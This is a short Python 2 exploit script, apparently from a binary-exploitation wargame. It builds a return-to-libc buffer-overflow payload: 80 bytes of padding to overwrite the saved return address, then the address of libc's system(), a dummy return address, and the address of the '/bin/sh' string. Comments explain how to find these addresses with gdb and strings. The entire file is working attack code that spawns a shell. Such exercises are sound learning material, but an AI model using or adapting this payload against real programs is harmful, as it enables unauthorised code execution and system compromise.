import struct

### EIP Offset
padding = "A"*80

### libc system
### in gdb: p system
system = struct.pack("I", 0xb7ecffb0)

### Return Address After system
### return address like from call bacause we didn't do call system, we just jumped to it
ret = "\x41" * 4

### in gdb break first instruction, run, info proc mappings

### p system
### out of gdb -> strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
### 0xb7e97000 - libc address
### 0x11f3bf   - offset to /bin/sh in libc
############
### or in gdb: find 0xb7ecffb0, +99999999, "/bin/sh" BUT THAT DOESN'T WORK LOL
shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)

print padding + system + ret + shell
